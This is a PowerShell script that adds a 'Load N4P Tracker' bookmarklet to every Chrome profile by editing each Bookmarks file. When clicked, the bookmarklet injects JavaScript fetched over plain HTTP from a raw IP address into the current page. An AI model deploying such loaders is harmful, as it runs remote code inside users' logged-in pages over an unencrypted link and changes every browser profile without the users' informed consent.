# Add N4P Tracker bookmarklet to Chrome bookmark bar
# This script adds the N4P loader to all Chrome profiles

$bookmarkUrl = "javascript:(function(){var s=document.createElement('script');s.src='http://52.16.14.220:8080/static/n4p.js';document.head.appendChild(s);console.log('[N4P] Script injected');})();"
$bookmarkName = "Load N4P Tracker"

$chromeDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"

if (!(Test-Path $chromeDataPath)) {
    Write-Host "Chrome not installed or data path not found" -ForegroundColor Red
    exit 1
}

$profiles = Get-ChildItem -Path $chromeDataPath -Directory | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }

foreach ($profile in $profiles) {
    $bookmarksFile = Join-Path $profile.FullName "Bookmarks"
    
    if (!(Test-Path $bookmarksFile)) {
        Write-Host "No bookmarks file in $($profile.Name)" -ForegroundColor Yellow
        continue
    }

    Write-Host "Processing profile: $($profile.Name)" -ForegroundColor Cyan

    # Read bookmarks JSON
    $bookmarksJson = Get-Content $bookmarksFile -Raw | ConvertFrom-Json

    # Find or create bookmark bar
    $bookmarkBar = $bookmarksJson.roots.bookmark_bar

    # Check if bookmark already exists
    $existingBookmark = $bookmarkBar.children | Where-Object { $_.name -eq $bookmarkName }

    if ($existingBookmark) {
        Write-Host "  Bookmark already exists, updating URL..." -ForegroundColor Yellow
        $existingBookmark.url = $bookmarkUrl
    } else {
        Write-Host "  Adding new bookmark..." -ForegroundColor Green
        
        # Create new bookmark object
        $newBookmark = @{
            date_added = [string]([DateTimeOffset]::Now.ToUnixTimeSeconds() * 1000000)
            date_last_used = "0"
            guid = [guid]::NewGuid().ToString()
            id = [string]($bookmarkBar.children.Count + 1000)
            name = $bookmarkName
            type = "url"
            url = $bookmarkUrl
        }

        # Add to bookmark bar
        $bookmarkBar.children += $newBookmark
    }

    # Save updated bookmarks (Chrome must be closed)
    $bookmarksJson | ConvertTo-Json -Depth 100 | Set-Content $bookmarksFile -Encoding UTF8

    Write-Host "  ✓ Bookmark added to $($profile.Name)" -ForegroundColor Green
}

Write-Host "`n✓ N4P bookmarklet deployed to all Chrome profiles" -ForegroundColor Green
Write-Host "Note: Close and reopen Chrome to see the bookmark" -ForegroundColor Yellow
